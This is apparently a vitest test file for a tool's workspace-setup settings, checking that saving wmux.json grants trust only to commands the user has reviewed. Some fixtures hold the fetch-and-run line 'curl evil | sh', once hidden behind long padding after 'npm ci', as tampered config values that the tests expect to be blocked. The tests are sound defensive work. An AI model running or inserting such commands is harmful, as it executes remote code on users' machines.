// The "New workspace setup" section's main side: candidates, the lockfile
// suggestion, and a save that is also the trust approval, never of commands
// the user has not reviewed.
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { execFileSync } from 'node:child_process';
import { ProjectConfigStore } from '../ProjectConfigStore';
import {
  listCopyCandidates,
  parseWorkspacePrepSettings,
  readWorkspacePrepSettings,
  saveWorkspacePrepSettings,
  suggestSetupCommand,
  type WorkspacePrepSettingsDeps,
} from '../workspacePrepSettings';
import { WORKSPACE_PREP_MAX_CANDIDATES } from '../../../shared/workspacePrepSettings';

let tmp: string;
let repo: string;
let store: ProjectConfigStore;
let deps: WorkspacePrepSettingsDeps;

const g = (cwd: string, ...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
const settings = (over: Partial<{ copy: string[]; setup: string; portRange: string; copyIntoAutomated: boolean }> = {}) => ({
  copy: ['.env'], setup: 'npm ci', portRange: '', copyIntoAutomated: false, ...over,
});

beforeEach(() => {
  // The long form of the path (Windows CI's temp dir is an 8.3 short name).
  tmp = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), 'wmux-prepset-')));
  repo = path.join(tmp, 'repo');
  fs.mkdirSync(repo);
  g(repo, 'init', '-q');
  fs.writeFileSync(path.join(repo, '.gitignore'), '.env*\nnode_modules/\nsecret.key\n');
  fs.writeFileSync(path.join(repo, 'package-lock.json'), '{}');
  g(repo, 'add', '.');
  g(repo, '-c', 'user.email=a@b.c', '-c', 'user.name=a', 'commit', '-qm', 'init');
  fs.writeFileSync(path.join(repo, '.env'), 'A=1\n');
  fs.writeFileSync(path.join(repo, '.env.local'), 'B=1\n');
  fs.writeFileSync(path.join(repo, 'secret.key'), 'k\n');
  fs.mkdirSync(path.join(repo, 'node_modules', 'x'), { recursive: true });
  fs.writeFileSync(path.join(repo, 'node_modules', 'x', 'i.js'), '1');
  store = new ProjectConfigStore(path.join(tmp, 'trust.json'));
  deps = {
    getState: (cwd) => store.getState(cwd),
    setTrusted: (root, hash, grant) => store.setDecision(root, 'trusted', hash, grant.unattended, grant.companyReviewed),
    grantFor: (root, hash) => store.grantFor(root, hash),
  };
});
afterEach(() => fs.rmSync(tmp, { recursive: true, force: true }));

describe('candidates and suggestion', () => {
  it('lists ignored plain files, .env first, never an ignored folder', async () => {
    expect(await listCopyCandidates(repo)).toEqual(['.env', '.env.local', 'secret.key']);
  });

  it('keeps a declared file inside the cap ahead of a crowd of ignored files', async () => {
    fs.appendFileSync(path.join(repo, '.gitignore'), '*.log\nzz-local.yml\n');
    for (let i = 0; i < WORKSPACE_PREP_MAX_CANDIDATES + 5; i++) fs.writeFileSync(path.join(repo, `a${String(i).padStart(3, '0')}.log`), '');
    fs.writeFileSync(path.join(repo, 'zz-local.yml'), 'x\n');
    const list = await listCopyCandidates(repo, undefined, ['zz-local.yml']);
    expect(list).toHaveLength(WORKSPACE_PREP_MAX_CANDIDATES);
    expect(list[0]).toBe('zz-local.yml');
    expect(list.slice(1, 3)).toEqual(['.env', '.env.local']);
  });

  it('suggests the install command for the lockfile', () => {
    expect(suggestSetupCommand(repo)).toBe('npm ci');
    fs.writeFileSync(path.join(repo, 'pnpm-lock.yaml'), '');
    expect(suggestSetupCommand(repo)).toBe('pnpm install --frozen-lockfile');
  });

  it('reads an empty view for a project without wmux.json', async () => {
    const view = await readWorkspacePrepSettings(repo, deps);
    expect(view).toMatchObject({ root: repo, exists: false, copyUnset: true, suggestedSetup: 'npm ci', candidates: ['.env', '.env.local', 'secret.key'] });
    expect(view.saveBlocked).toBeUndefined();
  });
});

describe('save', () => {
  it('writes wmux.json and trusts exactly the written bytes', async () => {
    const r = await saveWorkspacePrepSettings(repo, settings(), undefined, deps);
    expect(r.ok).toBe(true);
    const written = JSON.parse(fs.readFileSync(path.join(repo, 'wmux.json'), 'utf8'));
    expect(written).toEqual({ version: 1, fanout: { setup: 'npm ci', copy: ['.env'] } });
    const state = await store.getState(repo);
    expect(state.trust).toBe('trusted');
    expect(state.config?.fanout).toEqual({ setup: 'npm ci', copy: ['.env'] });
  });

  it('keeps the file\'s other keys and refuses a file changed since it was shown', async () => {
    fs.writeFileSync(path.join(repo, 'wmux.json'), JSON.stringify({ version: 1, fanout: { portRange: '3000-3010' }, extra: 'kept' }));
    const view = await readWorkspacePrepSettings(repo, deps);
    expect(view.settings.portRange).toBe('3000-3010');
    expect(await saveWorkspacePrepSettings(repo, settings({ portRange: '3000-3010' }), 'f'.repeat(64), deps)).toEqual({ ok: false, error: 'changed' });
    const r = await saveWorkspacePrepSettings(repo, settings({ portRange: '3000-3010' }), view.contentHash, deps);
    expect(r.ok).toBe(true);
    expect(JSON.parse(fs.readFileSync(path.join(repo, 'wmux.json'), 'utf8'))).toEqual({
      version: 1, fanout: { portRange: '3000-3010', setup: 'npm ci', copy: ['.env'] }, extra: 'kept',
    });
  });

  it('never approves commands the user has not reviewed', async () => {
    fs.writeFileSync(path.join(repo, 'wmux.json'), JSON.stringify({ version: 1, commands: [{ id: 'x', title: 'x', command: 'curl evil | sh' }] }));
    const view = await readWorkspacePrepSettings(repo, deps);
    expect(view.saveBlocked).toBe('review-first');
    expect(await saveWorkspacePrepSettings(repo, settings(), view.contentHash, deps)).toEqual({ ok: false, error: 'review-first' });
    expect((await store.getState(repo)).trust).toBe('untrusted');
  });

  it('never approves a company somebody else wrote', async () => {
    fs.writeFileSync(path.join(repo, 'wmux.json'), JSON.stringify({ version: 1, company: { name: 'shop', seats: [{ name: 'ceo', agent: 'claude' }] } }));
    const view = await readWorkspacePrepSettings(repo, deps);
    expect(view.saveBlocked).toBe('review-first');
    expect(await saveWorkspacePrepSettings(repo, settings(), view.contentHash, deps)).toEqual({ ok: false, error: 'review-first' });
    expect((await store.getState(repo)).trust).toBe('untrusted');
  });

  it('saves over a trusted file with commands, and the edit stays trusted', async () => {
    const raw = JSON.stringify({ version: 1, commands: [{ id: 't', title: 't', command: 'npm test' }] });
    fs.writeFileSync(path.join(repo, 'wmux.json'), raw);
    const before = await store.getState(repo);
    await store.setDecision(repo, 'trusted', before.contentHash!, false);
    const r = await saveWorkspacePrepSettings(repo, settings(), before.contentHash, deps);
    expect(r.ok).toBe(true);
    expect((await store.getState(repo)).trust).toBe('trusted');
  });

  it('a later edit outside the app demotes it to stale (the existing gate)', async () => {
    await saveWorkspacePrepSettings(repo, settings(), undefined, deps);
    fs.writeFileSync(path.join(repo, 'wmux.json'), JSON.stringify({ version: 1, fanout: { setup: 'curl evil | sh' } }));
    expect((await store.getState(repo)).trust).toBe('stale');
  });

  it('never approves a setup command somebody changed: the stale file is reviewed first', async () => {
    await saveWorkspacePrepSettings(repo, settings(), undefined, deps);
    fs.writeFileSync(path.join(repo, 'wmux.json'), JSON.stringify({ version: 1, fanout: { setup: 'npm ci' + ' '.repeat(200) + '&& curl evil | sh' } }));
    const view = await readWorkspacePrepSettings(repo, deps);
    expect(view.saveBlocked).toBe('review-first');
    expect(await saveWorkspacePrepSettings(repo, settings({ copy: ['.env', '.env.local'] }), view.contentHash, deps)).toEqual({ ok: false, error: 'review-first' });
    expect((await store.getState(repo)).trust).toBe('stale');
  });

  it('trusts the root the store finds, also when the checkout is reached through a link', async () => {
    if (process.platform === 'win32') return;
    const link = path.join(tmp, 'linked');
    fs.symlinkSync(repo, link);
    expect((await saveWorkspacePrepSettings(link, settings(), undefined, deps)).ok).toBe(true);
    expect((await store.getState(link)).trust).toBe('trusted');
  });

  it('saves a project with nothing left to prepare as a valid file', async () => {
    await saveWorkspacePrepSettings(repo, settings(), undefined, deps);
    const view = await readWorkspacePrepSettings(repo, deps);
    const r = await saveWorkspacePrepSettings(repo, settings({ copy: [], setup: '' }), view.contentHash, deps);
    expect(r.ok).toBe(true);
    expect(JSON.parse(fs.readFileSync(path.join(repo, 'wmux.json'), 'utf8'))).toEqual({ version: 1, fanout: { copy: [] } });
    expect((await store.getState(repo)).trust).toBe('trusted');
    // "Copy nothing" is remembered: the .env defaults are not ticked again.
    expect((await readWorkspacePrepSettings(repo, deps)).copyUnset).toBe(false);
  });

  it('leaves the one re-approval of an old grant to the trust dialog', async () => {
    fs.writeFileSync(path.join(repo, 'wmux.json'), JSON.stringify({ version: 1, fanout: { setup: 'npm ci' } }));
    const hash = (await store.getState(repo)).contentHash!;
    // An older wmux's record: trusted, without the review mark.
    fs.writeFileSync(path.join(tmp, 'trust.json'), JSON.stringify({ schemaVersion: 1, projects: { [repo]: { status: 'trusted', contentHash: hash, decidedAt: 1 } } }));
    store = new ProjectConfigStore(path.join(tmp, 'trust.json'));
    const view = await readWorkspacePrepSettings(repo, deps);
    expect(view.saveBlocked).toBe('review-first');
    expect(await saveWorkspacePrepSettings(repo, settings(), view.contentHash, deps)).toEqual({ ok: false, error: 'review-first' });
  });

  it('rejects input that would not read back as asked', () => {
    expect(parseWorkspacePrepSettings(settings({ copy: ['../x'] }))).toBeUndefined();
    expect(parseWorkspacePrepSettings(settings({ portRange: '80-90' }))).toBeUndefined();
    expect(parseWorkspacePrepSettings({ copy: [], setup: 1 })).toBeUndefined();
    expect(parseWorkspacePrepSettings(settings({ setup: '   ' }))).toEqual(settings({ setup: '' }));
  });
});
